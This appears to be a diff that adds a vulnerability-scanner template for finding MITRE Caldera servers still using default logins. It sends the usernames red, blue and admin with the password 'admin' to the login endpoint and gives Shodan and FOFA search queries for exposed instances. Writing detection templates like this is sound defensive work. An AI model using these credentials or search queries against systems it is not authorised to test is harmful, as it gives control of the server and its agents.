@@ -1,0 +1,70 @@
+id: caldera-default-login
+
+info:
+  name: MITRE Caldera - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    MITRE Caldera was found using default credentials. When started with the insecure default configuration, both the v4 (classic) and v5 (Magma) consoles ship static operator accounts - red, blue and admin - that all authenticate with the password "admin". An attacker who logs in gains full control of the adversary-emulation server and can run operations that execute commands on every connected agent.
+  reference:
+    - https://github.com/mitre/caldera
+    - https://caldera.readthedocs.io/en/latest/Server-Configuration.html
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    verified: true
+    max-request: 4
+    vendor: mitre
+    product: caldera
+    shodan-query: http.title:"Caldera"
+    fofa-query: title="Caldera"
+  tags: caldera,mitre,default-login,auth,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'contains(to_lower(body), "caldera")'
+
+  - raw:
+      - |
+        POST /enter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - red
+        - blue
+        - admin
+      password:
+        - admin
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "API_SESSION="
+
+      - type: status
+        status:
+          - 302
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
